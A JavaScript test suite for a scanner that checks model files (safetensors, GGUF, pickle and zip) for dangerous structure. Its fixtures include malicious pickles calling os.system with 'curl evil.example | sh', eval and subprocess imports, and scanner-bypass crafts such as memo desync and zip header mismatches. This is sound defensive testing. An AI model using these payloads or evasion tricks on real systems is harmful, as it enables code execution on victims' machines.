/** Format-safety gate: deterministic, native structural checks. Verdicts are
 * three-state — safe-format / risky-format / unknown — and unknown is never
 * collapsed into safe. Fixtures are tiny Buffers built in-test. */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { analyzeFileSafety, MAX_PICKLE_SCAN_BYTES } from '../src/main/format-safety.js';

const tmp = async (t, name, bytes) => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'fb-format-'));
  t.after(() => fs.rm(dir, { recursive: true, force: true }));
  const file = path.join(dir, name);
  await fs.writeFile(file, bytes);
  return file;
};

/* ----------------------------------------------------------- fixture builders */

function safetensors(tensors, dataBytes = 64) {
  const header = Buffer.from(JSON.stringify(tensors), 'utf8');
  const length = Buffer.alloc(8); length.writeBigUInt64LE(BigInt(header.length));
  return Buffer.concat([length, header, Buffer.alloc(dataBytes)]);
}
const goodTensors = { 'w.weight': { dtype: 'F16', shape: [4, 4], data_offsets: [0, 32] } };

function gguf({ version = 3, tensors = 1n, kvs = 0n, extra = 256 } = {}) {
  const head = Buffer.alloc(24);
  head.write('GGUF', 0, 'ascii');
  head.writeUInt32LE(version, 4);
  head.writeBigUInt64LE(tensors, 8);
  head.writeBigUInt64LE(kvs, 16);
  return Buffer.concat([head, Buffer.alloc(extra)]);
}

// Minimal pickle protocol-2 byte assembler.
const P = {
  proto: Buffer.from([0x80, 0x02]),
  emptyDict: Buffer.from([0x7d]),            // }
  mark: Buffer.from([0x28]),                 // (
  shortStr: s => Buffer.concat([Buffer.from([0x8c, s.length]), Buffer.from(s, 'utf8')]), // \x8c len s
  global: (mod, name) => Buffer.concat([Buffer.from('c', 'ascii'), Buffer.from(mod + '\n' + name + '\n', 'utf8')]),
  stackGlobal: Buffer.from([0x93]),          // \x93
  reduce: Buffer.from([0x52]),               // R
  build: Buffer.from([0x62]),                // b
  setitems: Buffer.from([0x75]),             // u
  stop: Buffer.from([0x2e]),                 // .
  emptyTuple: Buffer.from([0x29]),           // )
  memo: Buffer.from([0x71, 0x00]),           // q 0
};
const benignPickle = () => Buffer.concat([
  P.proto, P.emptyDict, P.memo, P.mark,
  P.shortStr('weight'),
  P.global('torch._utils', '_rebuild_tensor_v2'), P.emptyTuple, P.reduce,
  P.setitems, P.stop,
]);
const maliciousPickle = () => Buffer.concat([
  P.proto, P.global('os', 'system'), P.shortStr('curl evil.example | sh'), P.reduce, P.stop,
]);
const stackGlobalMalicious = () => Buffer.concat([
  P.proto, P.shortStr('posix'), P.shortStr('system'), P.stackGlobal, P.emptyTuple, P.reduce, P.stop,
]);

/* ---------------------------------------------------------------- safetensors */

test('valid safetensors header with in-bounds offsets is safe-format', async t => {
  const file = await tmp(t, 'model.safetensors', safetensors(goodTensors));
  const result = await analyzeFileSafety(file);
  assert.equal(result.verdict, 'safe-format');
  assert.equal(result.format, 'safetensors');
  assert.deepEqual(result.findings, []);
});

test('safetensors offsets past the data section are unknown, never safe', async t => {
  const file = await tmp(t, 'model.safetensors', safetensors({ w: { dtype: 'F16', shape: [4], data_offsets: [0, 999999] } }));
  const result = await analyzeFileSafety(file);
  assert.equal(result.verdict, 'unknown');
  assert.ok(result.findings.some(f => /offset/i.test(f.detail)));
});

test('safetensors with reversed or negative offsets is unknown', async t => {
  const file = await tmp(t, 'model.safetensors', safetensors({ w: { dtype: 'F16', shape: [4], data_offsets: [32, 8] } }));
  assert.equal((await analyzeFileSafety(file)).verdict, 'unknown');
});

test('safetensors with an implausible header length is unknown without allocating it', async t => {
  const length = Buffer.alloc(8); length.writeBigUInt64LE(0xffffffffffn);
  const file = await tmp(t, 'model.safetensors', Buffer.concat([length, Buffer.from('{}')]));
  assert.equal((await analyzeFileSafety(file)).verdict, 'unknown');
});

test('safetensors with invalid JSON header is unknown', async t => {
  const header = Buffer.from('{not json');
  const length = Buffer.alloc(8); length.writeBigUInt64LE(BigInt(header.length));
  const file = await tmp(t, 'model.safetensors', Buffer.concat([length, header]));
  assert.equal((await analyzeFileSafety(file)).verdict, 'unknown');
});

test('safetensors __metadata__ strings are allowed but tensors must be well-formed', async t => {
  const file = await tmp(t, 'model.safetensors', safetensors({ __metadata__: { format: 'pt' }, ...goodTensors }));
  assert.equal((await analyzeFileSafety(file)).verdict, 'safe-format');
  const bad = await tmp(t, 'bad.safetensors', safetensors({ w: { dtype: 'F16', shape: 'nope', data_offsets: [0, 32] } }));
  assert.equal((await analyzeFileSafety(bad)).verdict, 'unknown');
});

/* ---------------------------------------------------------------------- GGUF */

test('GGUF v3 header with plausible counts is safe-format', async t => {
  const file = await tmp(t, 'model.gguf', gguf());
  const result = await analyzeFileSafety(file);
  assert.equal(result.verdict, 'safe-format');
  assert.equal(result.format, 'gguf');
});

test('GGUF v1 and v2 are accepted; unsupported versions are unknown', async t => {
  for (const version of [1, 2]) assert.equal((await analyzeFileSafety(await tmp(t, `v${version}.gguf`, gguf({ version })))).verdict, 'safe-format');
  assert.equal((await analyzeFileSafety(await tmp(t, 'v9.gguf', gguf({ version: 9 })))).verdict, 'unknown');
});

test('GGUF truncated below the fixed header is unknown', async t => {
  const file = await tmp(t, 'short.gguf', Buffer.from('GGUF\x03'));
  assert.equal((await analyzeFileSafety(file)).verdict, 'unknown');
});

test('GGUF with implausible tensor/KV counts is unknown', async t => {
  const file = await tmp(t, 'huge.gguf', gguf({ tensors: 10n ** 12n }));
  assert.equal((await analyzeFileSafety(file)).verdict, 'unknown');
  const kv = await tmp(t, 'hugekv.gguf', gguf({ kvs: 10n ** 12n }));
  assert.equal((await analyzeFileSafety(kv)).verdict, 'unknown');
});

test('GGUF metadata KV walk validates strings and flags out-of-bounds lengths', async t => {
  // one KV: key "general.architecture" (string), type 8 (string), value "llama"
  const key = Buffer.from('general.architecture', 'utf8');
  const val = Buffer.from('llama', 'utf8');
  const kv = Buffer.alloc(8 + key.length + 4 + 8 + val.length);
  let o = 0;
  kv.writeBigUInt64LE(BigInt(key.length), o); o += 8;
  key.copy(kv, o); o += key.length;
  kv.writeUInt32LE(8, o); o += 4;
  kv.writeBigUInt64LE(BigInt(val.length), o); o += 8;
  val.copy(kv, o);
  const good = await tmp(t, 'kv.gguf', Buffer.concat([gguf({ kvs: 1n, extra: 0 }), kv, Buffer.alloc(64)]));
  assert.equal((await analyzeFileSafety(good)).verdict, 'safe-format');
  const badLen = Buffer.from(kv); badLen.writeBigUInt64LE(0xffffffffffn, 8 + key.length + 4);
  const bad = await tmp(t, 'kvbad.gguf', Buffer.concat([gguf({ kvs: 1n, extra: 0 }), badLen]));
  assert.equal((await analyzeFileSafety(bad)).verdict, 'unknown');
});

/* -------------------------------------------------------------------- pickle */

test('benign torch pickle is safe-format (risky family, no dangerous imports)', async t => {
  const file = await tmp(t, 'pytorch_model.bin', benignPickle());
  const result = await analyzeFileSafety(file);
  assert.equal(result.verdict, 'safe-format');
  assert.equal(result.format, 'pickle');
});

test('pickle GLOBAL os.system + REDUCE is risky-format naming the module', async t => {
  const file = await tmp(t, 'evil.bin', maliciousPickle());
  const result = await analyzeFileSafety(file);
  assert.equal(result.verdict, 'risky-format');
  assert.ok(result.findings.some(f => f.detail.includes('os.system')));
});

test('pickle STACK_GLOBAL posix/system is risky-format', async t => {
  const file = await tmp(t, 'evil.pt', stackGlobalMalicious());
  const result = await analyzeFileSafety(file);
  assert.equal(result.verdict, 'risky-format');
  assert.ok(result.findings.some(f => f.detail.includes('posix.system')));
});

test('pickle with builtins.eval is risky even though builtins has safe names', async t => {
  const bytes = Buffer.concat([P.proto, P.global('builtins', 'eval'), P.emptyTuple, P.reduce, P.stop]);
  const result = await analyzeFileSafety(await tmp(t, 'eval.pkl', bytes));
  assert.equal(result.verdict, 'risky-format');
  const ok = Buffer.concat([P.proto, P.global('builtins', 'set'), P.emptyTuple, P.reduce, P.stop]);
  assert.equal((await analyzeFileSafety(await tmp(t, 'set.pkl', ok))).verdict, 'safe-format');
});

test('numpy reconstruction helpers are allowlisted; numpy.f2py is not', async t => {
  const ok = Buffer.concat([P.proto, P.global('numpy.core.multiarray', '_reconstruct'), P.emptyTuple, P.reduce, P.stop]);
  assert.equal((await analyzeFileSafety(await tmp(t, 'np.pth', ok))).verdict, 'safe-format');
  const bad = Buffer.concat([P.proto, P.global('numpy.f2py', 'run'), P.emptyTuple, P.reduce, P.stop]);
  assert.equal((await analyzeFileSafety(await tmp(t, 'np2.pth', bad))).verdict, 'risky-format');
});

test('GLOBAL without a following REDUCE is still reported (import alone can execute)', async t => {
  const bytes = Buffer.concat([P.proto, P.global('subprocess', 'Popen'), P.stop]);
  const result = await analyzeFileSafety(await tmp(t, 'imp.pkl', bytes));
  assert.equal(result.verdict, 'risky-format');
});

test('truncated or opcode-invalid pickle is unknown, never safe', async t => {
  const cut = benignPickle().subarray(0, 6);
  assert.equal((await analyzeFileSafety(await tmp(t, 'cut.bin', cut))).verdict, 'unknown');
  const garbage = Buffer.concat([P.proto, Buffer.from([0xff, 0xff]), P.stop]);
  assert.equal((await analyzeFileSafety(await tmp(t, 'garbage.pkl', garbage))).verdict, 'unknown');
});

test('pickle without STOP is unknown (incomplete stream)', async t => {
  const bytes = benignPickle().subarray(0, benignPickle().length - 1);
  assert.equal((await analyzeFileSafety(await tmp(t, 'nostop.bin', bytes))).verdict, 'unknown');
});

test('pickle larger than the scan cap is unknown with an honest finding', async t => {
  const file = await tmp(t, 'big.bin', Buffer.concat([benignPickle(), Buffer.alloc(MAX_PICKLE_SCAN_BYTES)]));
  const result = await analyzeFileSafety(file);
  assert.equal(result.verdict, 'unknown');
  assert.ok(result.findings.some(f => /large/i.test(f.detail)));
});

test('zip container with entry named data.pkl is walked as pickle', async t => {
  // Build a minimal stored (uncompressed) zip with one entry "data.pkl".
  const name = Buffer.from('data.pkl');
  const data = maliciousPickle();
  const crc = (() => { let c, table = []; for (let n = 0; n < 256; n++) { c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; table[n] = c >>> 0; } let crc = 0xffffffff; for (const b of data) crc = table[(crc ^ b) & 0xff] ^ (crc >>> 8); return (crc ^ 0xffffffff) >>> 0; })();
  const local = Buffer.alloc(30);
  local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(0, 8); // stored
  local.writeUInt32LE(crc, 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(data.length, 22);
  local.writeUInt16LE(name.length, 26);
  const central = Buffer.alloc(46);
  central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6);
  central.writeUInt32LE(crc, 16); central.writeUInt32LE(data.length, 20); central.writeUInt32LE(data.length, 24);
  central.writeUInt16LE(name.length, 28); central.writeUInt32LE(0, 42); // offset of local header
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(1, 8); end.writeUInt16LE(1, 10);
  end.writeUInt32LE(central.length + name.length, 12); end.writeUInt32LE(30 + name.length + data.length, 16);
  const zip = Buffer.concat([local, name, data, central, name, end]);
  const result = await analyzeFileSafety(await tmp(t, 'model.bin', zip));
  assert.equal(result.format, 'pickle');
  assert.equal(result.verdict, 'risky-format');
  const benignZip = Buffer.concat([local.subarray(0, 0)]); // placeholder no-op
  void benignZip;
});

/* ------------------------------------------------------------------- unknown */

test('unknown extensions and missing files are unknown, not errors-as-safe', async t => {
  const file = await tmp(t, 'weights.xyz', Buffer.from('anything'));
  assert.equal((await analyzeFileSafety(file)).verdict, 'unknown');
  const missing = await analyzeFileSafety(path.join(os.tmpdir(), 'fb-does-not-exist-12345.bin'));
  assert.equal(missing.verdict, 'unknown');
});

/* ------------------------------------------- adversarial regressions */

function crc32(data) {
  let c, table = [];
  for (let n = 0; n < 256; n++) { c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; table[n] = c >>> 0; }
  let crc = 0xffffffff;
  for (const b of data) crc = table[(crc ^ b) & 0xff] ^ (crc >>> 8);
  return (crc ^ 0xffffffff) >>> 0;
}
// Minimal stored (method 0) zip: local headers + central directory + EOCD.
function storedZip(entries) {
  const locals = [], centrals = [];
  let offset = 0;
  for (const [name, data] of entries) {
    const nameBuf = Buffer.from(name);
    const crc = crc32(data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(0, 8);
    local.writeUInt32LE(crc, 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6);
    central.writeUInt32LE(crc, 16); central.writeUInt32LE(data.length, 20); central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(nameBuf.length, 28); central.writeUInt32LE(offset, 42);
    locals.push(local, nameBuf, data);
    centrals.push(central, nameBuf);
    offset += 30 + nameBuf.length + data.length;
  }
  const centralBuf = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(centralBuf.length, 12); end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, centralBuf, end]);
}

test('memo desync: interleaved PUT/MEMOIZE cannot smuggle a forbidden GLOBAL past STACK_GLOBAL', async t => {
  // CPython keys MEMOIZE by len(memo) — sparse PUTs count toward len, and a
  // MEMOIZE landing on an existing key overwrites it without growing len.
  // A scanner-private counter desyncs from that rule: it resolves BINGET 9/10
  // to the allowlisted torch._utils._rebuild_tensor_v2 pair (false safe),
  // while the real loader resolves system._rebuild_tensor_v2 — code execution.
  const memoize = s => Buffer.concat([P.shortStr(s), Buffer.from([0x94])]);
  const put = (s, i) => { const b = Buffer.alloc(5); b[0] = 0x72; b.writeUInt32LE(i, 1); return Buffer.concat([P.shortStr(s), b]); };
  const bytes = Buffer.concat([
    P.proto,
    put('torch._utils', 9), put('_rebuild_tensor_v2', 10),  // sparse PUTs: len=2, private next=11
    ...[0, 1, 2, 3, 4, 5, 6].map(i => memoize('junk' + i)), // loader memo 2..8 (len=9)
    memoize('os'),                                          // loader: overwrite memo[9]
    memoize('system'),                                      // loader: overwrite memo[9] again
    Buffer.from([0x68, 0x09, 0x68, 0x0a]),                  // BINGET 9, BINGET 10
    P.stackGlobal, P.emptyTuple, P.reduce, P.stop,
  ]);
  const result = await analyzeFileSafety(await tmp(t, 'desync.pkl', bytes));
  assert.equal(result.verdict, 'risky-format');
  assert.ok(result.findings.some(f => f.kind === 'import'), 'the loader-resolved global is not allowlisted');
  assert.ok(!result.findings.some(f => /torch\._utils\._rebuild_tensor_v2/.test(f.detail)),
    'must not resolve to the allowlisted pair the private-counter scanner saw');
});

test('benign interleaved memo stays safe-format (no false positive from the memo fix)', async t => {
  const bytes = Buffer.concat([
    P.proto,
    P.shortStr('torch._utils'), Buffer.from([0x72, 0x07, 0x00, 0x00, 0x00]), // PUT 7
    P.shortStr('x'), Buffer.from([0x94]),
    P.shortStr('_rebuild_tensor_v2'), Buffer.from([0x94]),
    Buffer.from([0x68, 0x07]),                                       // BINGET 7
    P.shortStr('_rebuild_tensor_v2'), P.stackGlobal, P.emptyTuple, P.reduce, P.stop,
  ]);
  const result = await analyzeFileSafety(await tmp(t, 'benign-interleave.pkl', bytes));
  assert.equal(result.verdict, 'safe-format');
});

test('zip pickle streams share one aggregate scan budget (zip-bomb DoS)', async t => {
  // 8 stored .pkl entries of 10MB each: individually under the per-stream cap,
  // together over it. Must stop as unknown, never inflate them all.
  const chunk = Buffer.alloc(10 * 1024 * 1024, 0x41);
  const entries = Array.from({ length: 8 }, (_, i) => [`p${i}.pkl`, chunk]);
  const result = await analyzeFileSafety(await tmp(t, 'bomb.bin', storedZip(entries)));
  assert.equal(result.verdict, 'unknown');
  assert.equal(result.format, 'pickle');
  assert.ok(result.findings.some(f => /budget|large/i.test(f.detail)));
});

test('zip with more pickle streams than the stream cap is unknown, not walked', async t => {
  const tiny = Buffer.from([0x80, 0x02, 0x7d, 0x2e]); // benign empty dict
  const entries = Array.from({ length: 70 }, (_, i) => [`p${i}.pkl`, tiny]);
  const result = await analyzeFileSafety(await tmp(t, 'many.bin', storedZip(entries)));
  assert.equal(result.verdict, 'unknown');
  assert.ok(result.findings.some(f => /too many/i.test(f.detail)));
});

test('deflate zip entries respect the remaining aggregate budget', async t => {
  const name = Buffer.from('data.pkl');
  const data = Buffer.alloc(40 * 1024 * 1024, 0x42); // inflates past the 64MB budget with a second entry
  const deflated = zlib.deflateRawSync(data);
  const crc = crc32(data);
  const mkLocal = (nameBuf, csize, usize, method) => {
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(method, 8);
    local.writeUInt32LE(crc, 14); local.writeUInt32LE(csize, 18); local.writeUInt32LE(usize, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    return local;
  };
  const first = Buffer.concat([mkLocal(name, deflated.length, data.length, 8), name, deflated]);
  const second = Buffer.concat([mkLocal(name, deflated.length, data.length, 8), name, deflated]);
  // Well-formed central directory: one entry per local header, matching
  // flags/method/sizes/name, distinct local offsets (zipfile semantics).
  const mkCentral = localOffset => {
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6);
    central.writeUInt16LE(8, 10); // method: deflate (must match local)
    central.writeUInt32LE(crc, 16); central.writeUInt32LE(deflated.length, 20); central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(name.length, 28); central.writeUInt32LE(localOffset, 42);
    return Buffer.concat([central, name]);
  };
  const cd = Buffer.concat([mkCentral(0), mkCentral(first.length)]);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(2, 8); end.writeUInt16LE(2, 10);
  end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(first.length + second.length, 16);
  const zip = Buffer.concat([first, second, cd, end]);
  const result = await analyzeFileSafety(await tmp(t, 'deflate-bomb.bin', zip));
  assert.equal(result.verdict, 'unknown');
  assert.ok(result.findings.some(f => /budget|large/i.test(f.detail)));
});

test('content sniff routes a pickle renamed .gguf to the pickle walk', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'model.gguf', maliciousPickle()));
  assert.equal(result.format, 'pickle');
  assert.equal(result.verdict, 'risky-format');
});

test('content sniff routes a zip renamed .safetensors to the pickle walk', async t => {
  const zip = storedZip([['data.pkl', maliciousPickle()]]);
  const result = await analyzeFileSafety(await tmp(t, 'model.safetensors', zip));
  assert.equal(result.format, 'pickle');
  assert.equal(result.verdict, 'risky-format');
});

test('content sniff routes a pickle with an unknown extension to the walk', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'weights.xyz', maliciousPickle()));
  assert.equal(result.format, 'pickle');
  assert.equal(result.verdict, 'risky-format');
});

test('real GGUF and safetensors still route by extension after sniffing', async t => {
  const g = await analyzeFileSafety(await tmp(t, 'real.gguf', gguf()));
  assert.equal(g.format, 'gguf'); assert.equal(g.verdict, 'safe-format');
  const s = await analyzeFileSafety(await tmp(t, 'real.safetensors', safetensors(goodTensors)));
  assert.equal(s.format, 'safetensors'); assert.equal(s.verdict, 'safe-format');
});

test('deep MARK nesting is bounded, not a stack overflow', async t => {
  const bytes = Buffer.concat([P.proto, Buffer.alloc(150_000, 0x28), P.stop]);
  const result = await analyzeFileSafety(await tmp(t, 'marks.pkl', bytes));
  assert.equal(result.verdict, 'unknown');
  assert.ok(result.findings.some(f => /mark overflow/i.test(f.detail)));
});

test('verdict shape is bounded: findings capped and details short', async t => {
  const many = [];
  for (let i = 0; i < 100; i++) many.push(P.global('os', 'system'), P.emptyTuple, P.reduce);
  const bytes = Buffer.concat([P.proto, ...many, P.stop]);
  const result = await analyzeFileSafety(await tmp(t, 'many.pkl', bytes));
  assert.equal(result.verdict, 'risky-format');
  assert.ok(result.findings.length <= 20);
  for (const f of result.findings) assert.ok(f.detail.length <= 300);
});

/* ------------------------------------- round-2 adversarial regressions */

// N1: PUT/GET line operands go through CPython int(), which accepts '1_0' and
// unicode digits. Number() parses those as NaN and desyncs the memo, letting a
// stream the loader resolves to os.system pass as an allowlisted pair.
// Craft verified against real CPython 3.14 (pickle._Unpickler): resolves os.system.
const n1Craft = putOperand => {
  const parts = [P.proto];
  parts.push(Buffer.concat([Buffer.from([0x8c, 4]), Buffer.from('junk'), Buffer.from([0x71, 10])])); // X'junk' q10
  parts.push(Buffer.concat([Buffer.from([0x8c, 5]), Buffer.from('junk2'), Buffer.from('p' + putOperand + '\n', 'utf8')]));
  for (const s of ['collections', 'os', 'OrderedDict', 'system']) parts.push(Buffer.concat([P.shortStr(s), Buffer.from([0x94])]));
  parts.push(Buffer.from([0x68, 2, 0x68, 4, 0x93, 0x29, 0x52, 0x2e])); // h2 h4 STACK_GLOBAL ) R .
  return Buffer.concat(parts);
};

test('N1: PUT operand "1_0" (CPython int()=10) never yields a false safe verdict', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n1-underscore.pkl', n1Craft('1_0')));
  assert.notEqual(result.verdict, 'safe-format');
  assert.equal(result.verdict, 'unknown'); // exotic operand → fail closed
});

test('N1: PUT operand with unicode digits never yields a false safe verdict', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n1-unicode.pkl', n1Craft('\u0661\u0660')));
  assert.notEqual(result.verdict, 'safe-format');
});

test('N1: PUT operand beyond 2^53 (float precision collision) fails closed', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n1-big.pkl', n1Craft('9007199254740993')));
  assert.notEqual(result.verdict, 'safe-format');
});

test('N1 control: canonical decimal PUT twin of the craft is risky-format naming os.system', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n1-canonical.pkl', n1Craft('10')));
  assert.equal(result.verdict, 'risky-format');
  assert.ok(result.findings.some(f => f.detail.includes('os.system')));
});

test('N1: GET line operand with unicode digits fails closed, never safe', async t => {
  const bytes = Buffer.concat([
    P.proto,
    Buffer.concat([P.shortStr('os'), Buffer.from([0x71, 10])]),      // X'os' q10
    Buffer.concat([P.shortStr('system'), Buffer.from([0x71, 11])]),  // X'system' q11
    Buffer.from('g\u0661\u0660\ng\u0661\u0661\n', 'utf8'),           // g١٠ g١١ (loader: memo 10,11)
    P.stackGlobal, P.emptyTuple, P.reduce, P.stop,
  ]);
  const result = await analyzeFileSafety(await tmp(t, 'n1-get.pkl', bytes));
  assert.notEqual(result.verdict, 'safe-format');
});

// N2: zipfile reads sizes/offsets/names from the CENTRAL DIRECTORY, not local
// headers. Crafts verified against real CPython zipfile.
test('N2: local-header size shrink (CD keeps full length) is unknown, never safe', async t => {
  const clean = benignPickle();
  const inner = Buffer.concat([clean, maliciousPickle()]);
  const zip = Buffer.from(storedZip([['data.pkl', inner]]));
  zip.writeUInt32LE(clean.length, 18); // local csize → clean only
  zip.writeUInt32LE(clean.length, 22); // local usize → clean only
  const result = await analyzeFileSafety(await tmp(t, 'n2-shrink.bin', zip));
  assert.notEqual(result.verdict, 'safe-format');
  assert.equal(result.verdict, 'unknown');
});

test('N2: CD name disagrees with local name (loader picks by CD) is unknown', async t => {
  const evil = maliciousPickle();
  const zip = Buffer.from(storedZip([['data.txt', evil]])); // same-length name swap
  const cdNameAt = 30 + 8 + evil.length + 46;
  zip.write('data.pkl', cdNameAt, 'ascii');
  const result = await analyzeFileSafety(await tmp(t, 'n2-name.bin', zip));
  assert.notEqual(result.verdict, 'safe-format');
});

test('N2: bytes between central directory end and EOCD are unknown', async t => {
  const zip = storedZip([['data.pkl', benignPickle()]]);
  const withJunk = Buffer.concat([zip.subarray(0, zip.length - 22), Buffer.from('JUNKJUNK'), zip.subarray(zip.length - 22)]);
  const result = await analyzeFileSafety(await tmp(t, 'n2-junk.bin', withJunk));
  assert.notEqual(result.verdict, 'safe-format');
});

test('N2: two CD entries claiming the same local offset are unknown', async t => {
  const evil = maliciousPickle();
  const zip = Buffer.from(storedZip([['a.pkl', benignPickle()], ['b.pkl', evil]]));
  // point the second CD entry at the first local header (offset 0)
  const firstEntryLen = 30 + 5 + benignPickle().length;
  const secondCdAt = firstEntryLen + 30 + 5 + evil.length + 46 + 5;
  zip.writeUInt32LE(0, secondCdAt + 42);
  const result = await analyzeFileSafety(await tmp(t, 'n2-dup.bin', zip));
  assert.notEqual(result.verdict, 'safe-format');
});

test('N2 control: canonical stored zip with benign pickle stays safe-format', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n2-ok.bin', storedZip([['data.pkl', benignPickle()]])));
  assert.equal(result.verdict, 'safe-format');
});

test('N2 control: canonical stored zip with malicious pickle stays risky-format', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n2-bad.bin', storedZip([['data.pkl', maliciousPickle()]])));
  assert.equal(result.verdict, 'risky-format');
});

// N3: protocol-0/1 ASCII pickles have no 0x80 PROTO byte. With a pickle-family
// extension they must still be walked (verified loadable by real CPython).
test('N3: protocol-0 ASCII pickle named .pkl with os.system is risky-format', async t => {
  const bytes = Buffer.from('cos\nsystem\n(S\'id\'\ntR.', 'ascii');
  const result = await analyzeFileSafety(await tmp(t, 'n3-proto0.pkl', bytes));
  assert.equal(result.verdict, 'risky-format');
  assert.ok(result.findings.some(f => f.detail.includes('os.system')));
});

test('N3: protocol-0 GLOBAL alone (no REDUCE) named .bin is risky-format', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n3-global.bin', Buffer.from('csubprocess\nPopen\n.', 'ascii')));
  assert.equal(result.verdict, 'risky-format');
});

test('N3: benign protocol-0 pickle is safe-format', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n3-ok.pkl', Buffer.from('ccollections\nOrderedDict\n.', 'ascii')));
  assert.equal(result.verdict, 'safe-format');
});

test('N3: plain text named .pkl is unknown (fail closed), never safe or risky', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n3-text.pkl', Buffer.from('hello world, just notes\n', 'ascii')));
  assert.equal(result.verdict, 'unknown');
});

test('N3 scope: protocol-0 bytes under an unknown extension stay unknown (no text-file false positives)', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n3-unknown.xyz', Buffer.from('cos\nsystem\n.', 'ascii')));
  assert.equal(result.verdict, 'unknown');
});

// N6: a legitimate small safetensors whose header length low bytes look like
// PROTO (e.g. length 128 → 0x80 0x00) must not be misrouted to the pickle walk.
test('N6: safetensors with 128-byte header (0x80 low byte) stays safe-format', async t => {
  const json = JSON.stringify(goodTensors);
  const padded = json + ' '.repeat(128 - Buffer.byteLength(json));
  const length = Buffer.alloc(8); length.writeBigUInt64LE(128n);
  const file = await tmp(t, 'n6-small.safetensors', Buffer.concat([length, Buffer.from(padded), Buffer.alloc(64)]));
  const result = await analyzeFileSafety(file);
  assert.equal(result.format, 'safetensors');
  assert.equal(result.verdict, 'safe-format');
});

test('N6: malformed safetensors that is really a pickle still routes to the walk', async t => {
  const result = await analyzeFileSafety(await tmp(t, 'n6-fake.safetensors', maliciousPickle()));
  assert.equal(result.format, 'pickle');
  assert.equal(result.verdict, 'risky-format');
});
